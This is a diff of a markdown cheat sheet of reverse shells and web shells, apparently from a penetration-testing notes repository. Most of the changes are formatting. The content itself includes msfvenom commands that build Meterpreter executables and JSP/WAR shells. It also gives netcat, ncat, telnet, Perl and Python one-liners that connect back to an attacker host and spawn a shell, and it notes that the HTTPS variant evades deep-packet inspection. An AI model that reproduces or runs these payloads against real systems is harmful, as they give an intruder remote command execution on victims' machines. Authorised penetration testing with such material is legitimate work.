@@ -1,11 +1,9 @@
 # Reverse-shells
 
+This is s great collection of different types of reverse shells and webshells. Many of the ones listed below comes from this cheat-sheet:  
+[https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 
-
-This is s great collection of different types of reverse shells and webshells. Many of the ones listed below comes from this cheat-sheet:
-https://highon.coffee/blog/reverse-shell-cheat-sheet/
-
-http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 
 ## Msfvenom
 
@@ -15,13 +13,12 @@ Therse is an important difference between non-staged and staged payload. A **non
 
 **staged** shells send them in turn. This can be useful for when you have very small buffer for your shellcode, so you need to divide upp the payload. Meterpreter is a staged shell. First it sends some parts of it and sents up the connetion, and then it sends some more. This can be caught with metasploit multi-handlet but not with netcat.
 
-
-
 ### Windows
 
 #### Meterpreter
 
 **Standard meterpreter**
+
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -o shell_reverse.exe
 ```
@@ -31,13 +28,12 @@ use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 ```
 
-**Meterpreter HTTPS**
-It makes the meterpreter-traffic look normal. Since it is hidden in https the communication is encrypted and can be used to bypass deep-packet inspections. 
+**Meterpreter HTTPS**  
+It makes the meterpreter-traffic look normal. Since it is hidden in https the communication is encrypted and can be used to bypass deep-packet inspections.
 
 ```
 msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.101 LPORT=443 -f exe -o met_https_reverse.exe
 ```
-
 
 #### Non-staged payload
 
@@ -120,9 +116,9 @@ nc 192.168.1.101 5555 -e /bin/bash
 # Windows
 nc -lvp 443
 nc.exe 192.168.1.101 443 -e cmd.exe
-
 ```
 
+**With -e flag**
 ```
 nc -e /bin/sh ATTACKING-IP 80
 ```
@@ -131,15 +127,18 @@ nc -e /bin/sh ATTACKING-IP 80
 /bin/sh | nc ATTACKING-IP 80
 ```
 
+**Without -e flag**
+
 ```
 rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
 ```
 
 ### Ncat
 
-Ncat is a better and more modern version of netcat. One feature it has that netcat does not have is encryption. If you are on a pentestjob you might not want to communicate unencrypted. 
+Ncat is a better and more modern version of netcat. One feature it has that netcat does not have is encryption. If you are on a pentestjob you might not want to communicate unencrypted.
 
 Bind
+
 ```
 ncat --exec cmd.exe --allow 192.168.1.101 -vnl 5555 --ssl
 ncat -v 192.168.1.103 5555 --ssl
@@ -154,7 +153,6 @@ rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
 ```
 telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
 ```
-
 
 ### Perl
 
@@ -181,7 +179,6 @@ p.waitFor()
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
-
 
 ## Web-shells - Platform Independent
 
@@ -210,3 +207,6 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > sh
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.jsp
 ```
+
+
+
